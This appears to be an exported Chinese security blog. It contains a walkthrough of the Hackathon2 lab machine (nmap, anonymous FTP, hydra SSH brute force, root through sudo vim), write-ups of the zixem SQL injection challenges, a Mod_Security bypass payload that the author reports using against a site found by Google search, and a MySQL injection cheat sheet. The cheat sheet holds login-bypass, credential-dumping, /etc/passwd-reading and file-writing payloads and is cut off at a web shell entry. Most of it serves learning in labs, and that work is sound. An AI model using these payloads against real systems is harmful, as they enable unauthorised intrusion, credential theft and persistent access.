00:50:56:f2:84:70       VMware, Inc.</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned <span class="keyword">in</span> 1.934 seconds (132.37 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure><p> 经<code>arp-scan</code>探测后发现存在<code>192.168.109.144</code>这个IP地址，对此IP地址进行端口扫描，一般会存在80端口</p><p> <strong>端口扫描</strong><br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.109.144 </span><br><span class="line"></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-23 23:33 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.109.144</span><br><span class="line">Host is up (0.00020s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| -rw-r--r--    1 1000     1000           47 Jun 18 17:32 flag1.txt</span><br><span class="line">|_-rw-r--r--    1 1000     1000          849 Jun 19 05:11 word.dir</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.109.140</span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth <span class="built_in">limit</span></span><br><span class="line">|      Session <span class="built_in">timeout</span> <span class="keyword">in</span> seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 1</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_*/</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: hackathon2</span><br><span class="line">7223/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 70:4a:a9:69:c2:d1:68:23:86:bd:85:83:31:ca:80:0c (RSA)</span><br><span class="line">|   256 a6:9e:a4:18:ad:a4:2b:7e:ea:f8:5e:63:29:6e:4f:24 (ECDSA)</span><br><span class="line">|_  256 4e:db:a6:d2:eb:b9:53:a5:d7:21:0b:4e:57:a5:f5:c1 (ED25519)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 11.09 seconds</span><br></pre></td></tr></table></figure><br> <code>nmap</code>扫描后发现存在21（ftp）、80（Apache-httpd）、7223（ssh）三个端口，针对这三个端口有必要进行以下信息收集：</p><ul><li>ftp（21）端口：<ul><li>尝试匿名用户登录（anonymous&#x2F;anonymous）✔</li><li>在漏洞数据库搜索相关ftp（vsftpd 3.0.3）版本漏洞 ✗</li></ul></li><li>http（80）端口：<ul><li>可进行目录扫描，爆破出隐藏的目录以及页面 ✔</li><li>查看已发现页面的源码，对<code>index.html</code>源码进行查看，无有用信息，因为是靶机，通常页面或者隐藏页面中源码会有一些有用的信息 ✔</li></ul></li><li>ssh（7223）端口<ul><li>在漏洞数据库搜索相关ssh（OpenSSH 8.2p1）版本漏洞 ✗</li><li>使用<code>hydra</code>进行爆破，此处需收集用户名、密码 ✔</li></ul></li></ul><p><strong>使用anonymous&#x2F;anonymous登录ftp</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; open 192.168.109.144</span><br><span class="line">Connected to 192.168.109.144.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (192.168.109.144:kali): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; <span class="built_in">ls</span></span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 1000     1000           47 Jun 18 17:32 flag1.txt</span><br><span class="line">-rw-r--r--    1 1000     1000          849 Jun 19 05:11 word.dir</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; </span><br></pre></td></tr></table></figure><p>匿名登录成功后可以看到<code>flag1.txt</code>和<code>word.dir</code>两个文件，猜测<code>word.dir</code>为一个字典文件，看了内容大概率是一个密码字典文件，如果使用其来爆破ssh用户名密码的话，此处还需要用户名， 因为本次靶机使用的ssh版本不存在用户名枚举漏洞，故猜测在80端口页面上可能存在用户名。</p><p><strong>进行目录扫描</strong><br><em><strong>这里有点问题：在使用dirb进行目录扫描时会发现除了几个通用的页面之外无其他有用信息</strong></em><br><em><strong>Tips：可以使用word.dic为字典文件进行目录扫描</strong></em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.109.144/ word.dir </span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sat Jul 24 01:52:28 2021</span><br><span class="line">URL_BASE: http://192.168.109.144/</span><br><span class="line">WORDLIST_FILES: word.dir</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 109                                                           </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.109.144/ ----</span><br><span class="line">+ http://192.168.109.144/happy (CODE:200|SIZE:110)                                                                               </span><br><span class="line">                                                                                                                                 </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sat Jul 24 01:52:28 2021</span><br><span class="line">DOWNLOADED: 109 - FOUND: 1</span><br></pre></td></tr></table></figure><p>经扫描后发现存在<code>happy</code>页面，访问后在源码上可发现暴露了一个用户名<br><img src="/images/pasted-18.png" class="lazyload" data-srcset="/images/pasted-18.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><p><strong>爆破ssh</strong><br>整理一下信息，现在在80端口下的<code>happy</code>页面发现用户名，在ftp上发现<code>word.dic</code>字典文件，可以尝试爆破ssh，进一步获取权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">hydra -l hackathonll -P word.dir -f -t 20 ssh://192.168.109.144 -s 7223 </span><br><span class="line"></span><br><span class="line">Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-24 00:16:41</span><br><span class="line">[WARNING] Many SSH configurations <span class="built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore</span><br><span class="line">[DATA] max 20 tasks per 1 server, overall 20 tasks, 110 login tries (l:1/p:110), ~6 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.109.144:7223/</span><br><span class="line">[7223][ssh] host: 192.168.109.144   login: hackathonll   password: Ti@gO</span><br><span class="line">[STATUS] attack finished <span class="keyword">for</span> 192.168.109.144 (valid pair found)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-24 00:16:58</span><br></pre></td></tr></table></figure><p><code>hydra</code>已经爆破出密码：<code>Ti@gO</code></p><p><strong>连接ssh</strong><br>使用已爆破的用户名、密码进行ssh连接至靶机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">ssh hackathonll@192.168.109.144 -p 7223                                    </span><br><span class="line"></span><br><span class="line">hackathonll@192.168.109.144<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-74-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System information as of Sat 24 Jul 2021 07:38:22 AM UTC</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System load:  0.01               Processes:              221</span></span><br><span class="line"><span class="string">  Usage of /:   24.2% of 18.57GB   Users logged in:        0</span></span><br><span class="line"><span class="string">  Memory usage: 20%                IPv4 address for ens33: 192.168.109.144</span></span><br><span class="line"><span class="string">  Swap usage:   0%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">67 updates can be installed immediately.</span></span><br><span class="line"><span class="string">0 of these updates are security updates.</span></span><br><span class="line"><span class="string">To see these additional updates run: apt list --upgradable</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The list of available updates is more than a week old.</span></span><br><span class="line"><span class="string">To check for new updates run: sudo apt update</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Sat Jul 24 04:18:07 2021 from 192.168.109.140</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=1001(hackathonll) gid=1001(hackathonll) groups=1001(hackathonll)</span></span><br><span class="line"><span class="string">$ </span></span><br></pre></td></tr></table></figure><p>连接成功，但是此时的用户为<code>hackathonll</code>，因此需要进行提权</p><p><strong>提权</strong><br>使用<code>sudo -l</code>查看是否可使用<code>sudo</code>进行提权，发现<code>vim</code>可以不验证密码具备<code>root</code>权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> hackathonll on hackathon:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User hackathonll may run the following commands on hackathon:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/vim</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上网查过后发现可直接使用<code>vim</code>进行提权，进入<code>vim</code>编辑界面时输入<code>!bash</code>可直接获取<code>root</code>权限<br><em><strong>可参考：<a href="https://blog.csdn.net/qq_39991837/article/details/118119954">https://blog.csdn.net/qq_39991837/article/details/118119954</a></strong></em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo vim</span><br><span class="line"></span><br><span class="line">root@hackathon:/home/hackathonll<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@hackathon:/home/hackathonll<span class="comment"># ls</span></span><br><span class="line">root@hackathon:/home/hackathonll<span class="comment"># cd</span></span><br><span class="line">root@hackathon:~<span class="comment"># ls</span></span><br><span class="line">flag2.txt  snap</span><br><span class="line">root@hackathon:~<span class="comment"># cat flag2.txt </span></span><br><span class="line">₣Ⱡ₳₲&#123;7e3c118631b68d159d9399bda66fc694&#125;</span><br><span class="line">root@hackathon:~<span class="comment"># </span></span><br></pre></td></tr></table></figure><p>至此，Hackathon2靶机渗透完成。。。<br><strong>done</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>zixem SQL challenges</title>
      <link href="/19459.html"/>
      <url>/19459.html</url>
      
        <content type="html"><![CDATA[<h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p><img src="/images/pasted-5.png" class="lazyload" data-srcset="/images/pasted-5.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>简单的一关，常规的联合查询注入(数字型)。</p><pre><code>?id=1 and 1=2 union select 1,concat(user(),version),3--+</code></pre><h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><p><img src="/images/pasted-6.png" class="lazyload" data-srcset="/images/pasted-6.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>同Level 1简单，字符型注入，闭合单引号即可。</p><pre><code>?showprofile=4&#39; and 1=2 union select 1,user(),version(),4--+</code></pre><h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><p><img src="/images/pasted-7.png" class="lazyload" data-srcset="/images/pasted-7.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>常规字符型注入，使用<code>--+</code>闭合单引号号即可，<br>在使用<code>union</code>进行注入时，<code>union</code>会变成<code>uni</code>，此时需要使用<code>unionon</code>。</p><pre><code>?item=3&#39; and 1=2 unionon select 1,user(),version(),4--+</code></pre><h2 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h2><p><img src="/images/pasted-8.png" class="lazyload" data-srcset="/images/pasted-8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>同Level 3，字符型注入，闭合单引号，注入语句无法使用<code>-</code>使其报错，可使用<code>and 1=2</code>。</p><pre><code>?ebookid=7&#39; and 1=2 union select 1,2,user(),version(),5--+</code></pre><h2 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h2><p>需要爆破，待…</p><h2 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h2><p><img src="/images/pasted-17.png" class="lazyload" data-srcset="/images/pasted-17.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><pre><code> and 1=2 union select (select id from teachers limit 1,1),(select teacher from teachers limit 1,1),(select teacher_age from teachers limit 1,1),(select price from teachers limit 1,1)--</code></pre><h2 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h2><p><img src="/images/pasted-9.png" class="lazyload" data-srcset="/images/pasted-9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>这一关有点意思，注入好久没发现问题在哪，网上搜索后发现数据提交之后页面源代码中有个隐藏的<code>value</code>。</p><p><img src="/images/pasted-10.png" class="lazyload" data-srcset="/images/pasted-10.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>图中<code>value</code>的值就是注入点，后面都是常规注入操作</p><pre><code>?id=1 AND 1=2 UNION SELECT 1,user(),3--+</code></pre><h2 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h2><p><img src="/images/pasted-11.png" class="lazyload" data-srcset="/images/pasted-11.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>这一关会对<code>%20</code>进行过滤（初步判断）以及会对<code>select</code>进行检测，双写可绕过，数字型注入，可使用<code>%09、%0d</code>进行绕过，后面就是常规的注入操作。</p><pre><code>?id=1%09and%091=2%09union%09seselectlect%09user(),version(),3--%09-</code></pre><h2 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h2><p><img src="/images/pasted-12.png" class="lazyload" data-srcset="/images/pasted-12.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>这一关需要读取<code>/etc/passwd</code>文件，经测试知道<code>load_file()</code>被禁止。不过在插入SQL注入语句(字符型注入)时会报以下错误：</p><p><img src="/images/pasted-13.png" class="lazyload" data-srcset="/images/pasted-13.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>根据报错提示可以在<code>1</code>处进行读取</p><pre><code>?id=1&#39; and 1=2 union select &#39;../etc/passwd&#39;,2-- -</code></pre><h2 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h2><p><img src="/images/pasted-14.png" class="lazyload" data-srcset="/images/pasted-14.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>这一关<code>x</code>为注入点，但是参数是经过编码的，刚开始以为是<code>base64 encode + url encode</code>,解码后发现并没有那么简单，经过看别人的blog后了解到是<code>uuencode</code>，解码后参数显示为<code>1</code>。将SQL注入语句经过编码后可正常执行。</p><p><img src="/images/pasted-15.png" class="lazyload" data-srcset="/images/pasted-15.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>将SQL注入语句编码后即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1 and 1=2 union select 1,concat(user(),version())-- -</span><br><span class="line"></span><br><span class="line">经过uuencode加密后得到</span><br><span class="line">M,2!A;F0@,3TR(&#x27;5N:6]N(&#x27;-E;&amp;5C=&quot;`Q+&amp;-O;F-A=&quot;AU&lt;V5R*&quot;DL=F5R&lt;VEO</span><br><span class="line">(;B@I*2TM(&quot;T`</span><br><span class="line">`</span><br><span class="line"></span><br><span class="line">再使用base64进行编码得到</span><br><span class="line">TSwyIUE7RjBALDNUUignNU46Nl1OKCctRTsmNUM9ImBRKyYtTztGLUE9IkFVPFY1UioiREw9RjVSPFZFTwooO0JASSoyVE0oIlRgCmA=</span><br><span class="line"></span><br><span class="line">最后使用url编码得到最终payload</span><br><span class="line">TSwyIUE7RjBALDNUUignNU46Nl1OKCctRTsmNUM9ImBRKyYtTztGLUE9IkFVPFY1UioiREw9RjVSPFZFTwooO0JASSoyVE0oIlRgCmA%3D</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-16.png" class="lazyload" data-srcset="/images/pasted-16.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br><strong>done</strong></p><p><strong>参考链接 <a href="https://medium.com/ctf-writeups/union-sqli-challenges-zixem-write-up-4e74ad4e88b4">https://medium.com/ctf-writeups/union-sqli-challenges-zixem-write-up-4e74ad4e88b4</a></strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Bypass Mod_Security</title>
      <link href="/14163.html"/>
      <url>/14163.html</url>
      
        <content type="html"><![CDATA[<h1 id="记bypass-Mod-Security"><a href="#记bypass-Mod-Security" class="headerlink" title="记bypass Mod_Security"></a>记bypass Mod_Security</h1><h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><pre><code>Google上搜索相关SQL注入，在测试中发现使用联合查询注入时会报错`Not Acceptable! An appropriate representation of the requested resource could not be found on this server. This error was generated by Mod_Security.`，使用order by 猜解显示位时不会报错</code></pre><h3 id="经过"><a href="#经过" class="headerlink" title="经过"></a>经过</h3><pre><code>懒得fuzz，直接Google搜索了相关bypass文章，文章中详细介绍了fuzz过程，直接修改payload进行注入。</code></pre><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><pre><code>结果当然是ok的了，成功注出数据库名和版本信息，后面操作大同小异，溜溜球！</code></pre><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*!12345UnIoN*//**/(/*!12345SEleCt*//**/ 1,2,3,4,5,6,7)--+</span><br></pre></td></tr></table></figure><p><strong>done</strong> </p><p><strong>参考链接：<a href="https://y000o.medium.com/how-to-bypass-mod-security-waf-156e2315b8ad">https://y000o.medium.com/how-to-bypass-mod-security-waf-156e2315b8ad</a></strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MYSQL备忘录</title>
      <link href="/22293.html"/>
      <url>/22293.html</url>
      
        <content type="html"><![CDATA[<ul><li>列出可用的数据库<br> <code>SHOW DATABASE;</code></li><li>切换到数据库<br>   <code>USE table_name</code></li></ul><h3 id="表"><a href="#表" class="headerlink" title="表"></a>表</h3><ul><li>添加新表<br> <code>CREATE TABLE logins (id INT, ...)</code></li><li>列出当前数据库中的可用表<br> <code>SHOW TABLES;</code></li><li>显示表属性和列<br> <code>DESCRIBE logins</code></li><li>将值添加到表<br> <code>INSERT INTO table_name VALUES (value_1,...)</code></li><li>将值添加到表中的特定列<br> <code>INSERT INTO table_name(colums2,...) VALUES(column2_value, ...)</code></li><li>更新表值<br> <code>UPDATE table_name SET column1=newvalue1,...WHERE &lt;CONDITION&gt;</code></li></ul><h3 id="列"><a href="#列" class="headerlink" title="列"></a>列</h3><ul><li>显示表格中的所有列<br> <code>SELECT * FROM table_name</code></li><li>显示表格中的特定列<br>   <code>SELECT column1, column2 FROM table_name</code></li><li>删除表<br> <code>DROP TABLE logins</code></li><li>添加新列<br> <code>ALTER TABLE logins ADD newColumn INT</code></li><li>重命名列<br> <code>ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn</code></li><li>更改列数据类型<br>   <code>ALTER TABLE logins MODIFY oldColumn DATE</code></li><li>删除列<br> <code>ALTER TABLE logins DROP oldColumn</code></li></ul><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><ul><li>按列排序<br>   <code>SELECT * FROM logins ORDER BY column_1</code></li><li>按列降序排序<br> <code>SELECT * FROM logins ORDER BY column_1 DESC</code></li><li>按两列排序<br> <code>SELECT * FROM logins ORDER BY column_1 DESC, id ASC</code></li><li>只显示前两个结果<br> <code>SELECT * FROM logins LIMIT 2</code></li><li>只显示从索引2开始的前两个结果<br> <code>SELECT * FROM logins LIMIT 1,2</code></li><li>列出满足条件的结果<br> <code>SELECT * FROM table_name WHERE &lt;condition&gt;</code></li><li>列出名称与给定字符串相似的结果<br>   <code>SELECT * FROM logins WHERE username LIKE &#39;admin%&#39;</code></li></ul><h3 id="MySQL运算符优先级"><a href="#MySQL运算符优先级" class="headerlink" title="MySQL运算符优先级"></a>MySQL运算符优先级</h3><ul><li>除法(&#x2F;)、乘法（<code>*</code>）和模数（%）</li><li>加法（+）和减法（-）</li><li>比较（&#x3D;,&gt;,&lt;,&lt;&#x3D;,&gt;&#x3D;,!&#x3D;,LIKE）</li><li>不是（！）</li><li>与（&amp;&amp;）</li><li>或（||）</li></ul><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><h3 id="身份验证绕过"><a href="#身份验证绕过" class="headerlink" title="身份验证绕过"></a>身份验证绕过</h3><ul><li>基本身份认证绕过<br>   <code>admin&#39; or &#39;1&#39;=&#39;1</code></li><li>带注释的基本身份验证绕过<br>   <code>admin&#39;)-- -</code></li></ul><h3 id="union-injection"><a href="#union-injection" class="headerlink" title="union injection"></a>union injection</h3><ul><li>使用检测列数 order by<br> <code>&#39; order by 1-- -</code></li><li>使用联合注入检测列数<br> <code>cn&#39; UNION select 1,2,3-- -</code></li><li>基本联合注入<br> <code>cn&#39; UNION select 1,@@version,3,4-- -</code></li><li>4列联合注入<br>   <code>UNION select username, 2, 3, 4 from passwords-- -</code></li></ul><h3 id="数据库枚举"><a href="#数据库枚举" class="headerlink" title="数据库枚举"></a>数据库枚举</h3><ul><li>带查询输出的指纹 MySQL<br> <code>SELECT @@version</code></li><li>没有输出的指纹 MySQL<br>   <code>SELECT SLEEP(5)</code></li><li>当前数据库名称<br> <code>cn&#39; UNION select 1,database(),2,3-- -</code></li><li>列出所有数据库<br>   <code>cn&#39; UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -</code></li><li>列出特定数据库中的所有表<br> <code>cn&#39; UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema=&#39;dev&#39;-- -</code></li><li>列出特定表中的所有列<br> <code>cn&#39; UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name=&#39;credentials&#39;-- -</code></li><li>从另一个数据库中的表转储数据<br> <code>cn&#39; UNION select 1, username, password, 4 from dev.credentials-- -</code></li></ul><h3 id="特权"><a href="#特权" class="headerlink" title="特权"></a>特权</h3><ul><li>查找当前用户<br>   <code>cn&#39; UNION SELECT 1,user(),3,4-- -</code></li><li>查找用户是否具有管理员权限<br>   <code>cn&#39; UNION SELECT 1,super_priv,3,4 FROM mysql.user WHERE user=&quot;root&quot;-- -</code></li><li>查找是否所有用户权限<br> <code>cn&#39; UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user=&quot;root&quot;-- -</code></li><li>查找可以通过 MySQL 访问的目录<br> <code>cn&#39; UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot;-- -</code></li></ul><h3 id="文件注入"><a href="#文件注入" class="headerlink" title="文件注入"></a>文件注入</h3><ul><li>读取本地文件<br>   <code>cn&#39; UNION SELECT 1, LOAD_FILE(&quot;/etc/passwd&quot;), 3, 4-- -</code></li><li>将字符串写入本地文件<br> <code>select &#39;file written successfully!&#39; into outfile &#39;/var/www/html/proof.txt&#39;</code></li><li>将 web shell 写入基本 web 目录<br>   